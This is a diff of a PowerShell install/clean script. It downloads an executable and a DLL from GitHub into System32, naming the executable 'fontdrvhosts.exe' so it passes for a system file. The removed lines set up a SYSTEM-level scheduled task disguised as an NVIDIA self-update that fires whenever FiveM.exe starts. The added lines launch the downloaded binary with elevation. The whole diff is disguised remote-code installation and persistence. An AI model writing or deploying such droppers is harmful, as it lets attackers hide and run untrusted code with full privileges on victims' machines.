@@ -2,7 +2,7 @@
 # Menu Selection
 # -----------------------------
 Write-Host "Select Mode:"
-Write-Host "1. Install"
+Write-Host "1. Install & Run"
 Write-Host "2. Clean"
 
 $choice = Read-Host "Enter choice (1/2)"
@@ -24,10 +24,9 @@ $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
 $dllDestination = Join-Path $system32Path "Guna.UI2.dll"
 $exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/webKUYTAIMAKTAK/raw/refs/heads/main/seanual.exe"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
-$taskName = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
 
 # -----------------------------
-# Install Mode
+# Install & Run Mode
 # -----------------------------
 if ($choice -eq "1") {
     Write-Host "`nStarting installation..."
@@ -54,23 +53,13 @@ if ($choice -eq "1") {
         exit
     }
 
-    # Create scheduled task
-    Write-Host "Creating scheduled task..."
+    # Run the program directly
+    Write-Host "Starting the program..."
     try {
-        $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
-        Invoke-Expression $cmd
-        Write-Host "Scheduled task created." -ForegroundColor Green
+        Start-Process -FilePath $exeDestination -Verb RunAs
+        Write-Host "Program started successfully." -ForegroundColor Green
     } catch {
-        Write-Host "Task creation failed: $_" -ForegroundColor Red
-    }
-
-    # Enable audit logging
-    Write-Host "Enabling audit logging..."
-    try {
-        auditpol /set /subcategory:"Process Creation" /success:enable
-        Write-Host "Audit logging enabled." -ForegroundColor Green
-    } catch {
-        Write-Host "Audit logging setup failed: $_" -ForegroundColor Red
+        Write-Host "Failed to start program: $_" -ForegroundColor Red
     }
 
     Write-Host "`nInstallation completed successfully." -ForegroundColor Green
@@ -82,13 +71,13 @@ if ($choice -eq "1") {
 elseif ($choice -eq "2") {
     Write-Host "Cleaning up installation..."
 
-    # Remove scheduled task
-    Write-Host "Removing scheduled task..."
+    # Stop the process if running
+    Write-Host "Stopping fontdrvhosts.exe process..."
     try {
-        schtasks /delete /tn $taskName /f
-        Write-Host "Scheduled task removed." -ForegroundColor Green
+        Stop-Process -Name "fontdrvhosts" -Force -ErrorAction SilentlyContinue
+        Write-Host "Process stopped." -ForegroundColor Green
     } catch {
-        Write-Host "Task removal failed: $_" -ForegroundColor Yellow
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
     }
 
     # Remove files if they exist
